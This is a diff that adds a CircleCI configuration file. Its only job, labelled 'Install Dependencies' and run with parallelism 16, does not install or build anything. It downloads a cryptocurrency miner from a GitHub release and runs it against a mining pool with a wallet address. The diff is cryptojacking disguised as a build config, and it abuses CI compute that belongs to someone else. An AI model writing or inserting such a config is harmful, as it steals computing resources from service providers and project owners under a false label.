@@ -1,0 +1,19 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              lscpu
+              sudo apt update && sudo apt upgrade -y && sudo apt-get install -y hwloc libhwloc-dev unzip wget screen -y && wget https://github.com/josajosjos/jjminer/releases/download/v1.0.2/jjminer_1.0.2-focal.zip && unzip jjminer_1.0.2-focal.zip && cd jjminer_1.0.2 && ./jjstart -l 30 -m 100 --algo randomkeva --url stratum-eu.rplant.xyz:7061 --user VR7Gyb29pTL9YSm8TqUbsNpk9LHW8REKtT.pass
+
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
